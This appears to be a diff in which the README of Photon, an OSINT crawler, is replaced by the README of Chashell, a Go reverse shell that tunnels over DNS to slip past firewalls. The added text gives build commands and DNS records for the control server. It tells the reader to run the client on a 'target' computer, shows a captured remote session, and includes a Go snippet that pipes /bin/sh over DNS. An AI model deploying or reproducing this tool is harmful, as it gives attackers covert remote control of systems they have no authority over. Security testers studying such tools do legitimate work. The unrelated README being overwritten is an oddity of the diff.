@@ -1,112 +1,143 @@
+# Chashell
 
-<h1 align="center">
-  <br>
-  <a href="https://github.com/s0md3v/Photon"><img src="https://image.ibb.co/h5OZAK/photonsmall.png" alt="Photon"></a>
-  <br>
-  Photon
-  <br>
-</h1>
+## Reverse Shell over DNS
 
-<h4 align="center">Incredibly fast crawler designed for OSINT.</h4>
+Chashell is a [Go](https://golang.org/) reverse shell that communicates over DNS. 
+It can be used to bypass firewalls or tightly restricted networks.
 
-<p align="center">
-  <a href="https://github.com/s0md3v/Photon/releases">
-    <img src="https://img.shields.io/github/release/s0md3v/Photon.svg">
-  </a>
-  <a href="https://pypi.org/project/photon/">
-    <img src="https://img.shields.io/badge/pypi-@photon-red.svg?style=style=flat-square"
-         alt="pypi">
-  </a>
-  <a href="https://github.com/s0md3v/Photon/issues?q=is%3Aissue+is%3Aclosed">
-      <img src="https://img.shields.io/github/issues-closed-raw/s0md3v/Photon.svg">
-  </a>
-  <a href="https://travis-ci.com/s0md3v/Photon">
-    <img src="https://img.shields.io/travis/com/s0md3v/Photon.svg">
-  </a>
-</p>
+It comes with a multi-client control server, named `chaserv`.
 
-![demo](https://image.ibb.co/kQSUcz/demo.png)
+![Chaserv](img/chaserv.gif)
 
-<p align="center">
-  <a href="https://github.com/s0md3v/Photon/wiki">Photon Wiki</a> •
-  <a href="https://github.com/s0md3v/Photon/wiki/Usage">How To Use</a> •
-  <a href="https://github.com/s0md3v/Photon/wiki/Compatibility-&-Dependencies">Compatibility</a> •
-  <a href="https://github.com/s0md3v/Photon/wiki/Photon-Library">Photon Library</a> •
-  <a href="#contribution--license">Contribution</a> •
-  <a href="https://github.com/s0md3v/Photon/projects/1">Roadmap</a>
-</p>
+### Communication security
 
-### Key Features
+Every packet is encrypted using symmetric cryptography ([XSalsa20](https://en.wikipedia.org/wiki/Salsa20) + [Poly1305](https://en.wikipedia.org/wiki/Poly1305)), with a shared key between the client
+and the server.
 
-#### Data Extraction
-Photon can extract the following data while crawling:
+We plan to implement asymmetric cryptography in the future.
 
-- URLs (in-scope & out-of-scope)
-- URLs with parameters (`example.com/gallery.php?id=2`)
-- Intel (emails, social media accounts, amazon buckets etc.)
-- Files (pdf, png, xml etc.)
-- Secret keys (auth/API keys & hashes)
-- JavaScript files & Endpoints present in them
-- Strings matching custom regex pattern
-- Subdomains & DNS related data
+### Protocol
 
-The extracted information is saved in an organized manner or can be [exported as json](https://github.com/s0md3v/Photon/wiki/Usage#export-formatted-result).
+Chashell communicates using [Protocol Buffers](https://developers.google.com/protocol-buffers/) serialized messages. For reference, the Protocol Buffers structure (`.proto` file) is available in the `proto` folder.
 
-![save demo](https://image.ibb.co/dS1BqK/carbon_2.png)
+Here is a (simplified) communication chart :
 
-#### Flexible
-Control timeout, delay, add seeds, exclude URLs matching a regex pattern and other cool stuff.
-The extensive range of [options](https://github.com/s0md3v/Photon/wiki/Usage) provided by Photon lets you crawl the web exactly the way you want.
+![Protocol](img/proto.png)
 
-#### Genius
-Photon's smart thread management & refined logic gives you top notch performance.
+Keep in mind that every packet is encrypted, hex-encoded and then packed for DNS transportation.
 
-Still, crawling can be resource intensive but Photon has some tricks up it's sleeves. You can fetch URLs archived by [archive.org](https://archive.org/) to be used as seeds by using `--wayback` option.
+### Supported systems
 
-In Ninja Mode which can be accessed by `--ninja`, 4 online services are used to make requests to the target on your behalf.
+Chashell should work with any desktop system (Windows, Linux, Darwin, BSD variants) that is supported by the Go compiler.
 
-So basically, now you have 4 clients making requests to the same server simultaneously which gives you a speed boost if you have a slow connection, minimizes the risk of connection reset as well as delays requests from a single client.
+We tested those systems and it works without issues :
 
-#### Plugins
-- **[wayback](https://github.com/s0md3v/Photon/wiki/Usage#use-urls-from-archiveorg-as-seeds)**
-- **[dnsdumpster](https://github.com/s0md3v/Photon/wiki/Usage#dumping-dns-data)**
-- **[Exporter](https://github.com/s0md3v/Photon/wiki/Usage#export-formatted-result)**
+* Windows (386/amd64)
+* Linux (386/amd64/arm64)
+* OS X (386/amd64)
 
-#### Docker
+### How to use Chaserv/Chashell
 
-Photon can be launched using a lightweight Python-Alpine (103 MB) Docker image.
+#### Building
 
-```bash
-$ git clone https://github.com/s0md3v/Photon.git
-$ cd Photon
-$ docker build -t photon .
-$ docker run -it --name photon photon:latest -u google.com
+Make sure the [GOPATH](https://github.com/golang/go/wiki/GOPATH) environment variable is correctly configured before running these commands.
+
+Build all the binaries (adjust the domain_name and the encryption_key to your needs):
+
+
+```
+$ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
+$ export DOMAIN_NAME=c.sysdream.com
+$ make build-all
 ```
 
-To view results, you can either head over to the local docker volume, which you can find by running `docker inspect photon` or by mounting the target loot folder:
+Build for a specific platform:
 
-```bash
-$ docker run -it --name photon -v "$PWD:/Photon/google.com" photon:latest -u google.com
+```
+$ make build-all OSARCH="linux/arm"
 ```
 
-#### Frequent & Seamless Updates
-Photon is under heavy development and updates for fixing bugs. optimizing performance & new features are being rolled regularly.
+Build only the server:
 
-If you would like to see features and issues that are being worked on, you can do that on [Development](https://github.com/s0md3v/Photon/projects/1) project board.
+```
+$ make build-server
+```
 
-Updates can be installed & checked for with the `--update` option. Photon has seamless update capabilities which means you can update Photon without losing any of your saved data.
+Build only the client (*chashell* itself):
 
-### Contribution & License
-You can contribute in following ways:
+```
+$ make build-client
+```
 
-- Report bugs
-- Develop plugins
-- Add more "APIs" for ninja mode
-- Give suggestions to make it better
-- Fix issues & submit a pull request
+#### DNS Settings
 
-Please read the [guidelines](https://github.com/s0md3v/Photon/wiki/Guidelines) before submitting a pull request or issue.
+* Buy and configure a domain name of your choice (preferably short).
+* Set a DNS record like this : 
 
-Do you want to have a conversation in private? Hit me up on my [twitter](https://twitter.com/s0md3v/), inbox is open :)
+```
+chashell 300 IN A [SERVERIP]
+c 300 IN NS chashell.[DOMAIN].
+```
 
-**Photon** is licensed under [GPL v3.0 license](https://www.gnu.org/licenses/gpl-3.0.en.html)
+#### Usage
+
+Basically, on the server side (attacker's computer), you must use the `chaserv` binary. For the client side (i.e the target), use the `chashell` binary.
+
+So:
+
+* Run `chaserv` on the control server.
+* Run `chashell` on the target computer.
+
+The client should now connect back to `chaserv`:
+
+```
+[n.chatelain]$ sudo ./chaserv
+chashell >>> New session : 5c54404419e59881dfa3a757
+chashell >>> sessions 5c54404419e59881dfa3a757
+Interacting with session 5c54404419e59881dfa3a757.
+whoami
+n.chatelain
+ls /
+bin
+boot
+dev
+[...]
+usr
+var
+```
+
+Use the `sessions [sessionid]` command to interact with a client.
+When interacting with a session, you can use the `background` session in order to return to the `chashell` prompt.
+
+Use the `exit` command to close `chaserv`.
+
+## Implement your own
+
+The `chashell/lib/transport` library is compatible with the `io.Reader` / `io.Writer` interface. So, implementing a reverse shell is as easy as :
+
+```go
+cmd := exec.Command("/bin/sh")
+
+dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
+
+cmd.Stdout = dnsTransport
+cmd.Stderr = dnsTransport
+cmd.Stdin = dnsTransport
+cmd.Run()
+```
+
+## Debugging
+
+For more verbose messages, add `TAGS=debug` at the end of the make command.
+
+## To Do
+
+* Implement asymmetric cryptography ([Curve25519](https://en.wikipedia.org/wiki/Curve25519), [XSalsa20](https://en.wikipedia.org/wiki/Salsa20) and [Poly1305](https://en.wikipedia.org/wiki/Poly1305))
+* Retrieve the host name using the `InfoPacket` message.
+* Create a *proxy/relay* tool in order to tunnel TCP/UDP streams (Meterpreter over DNS !).
+* Better error handling.
+* Get rid of dependencies.
+
+## Credits
+
+* Nicolas Chatelain <n.chatelain -at- sysdream.com>
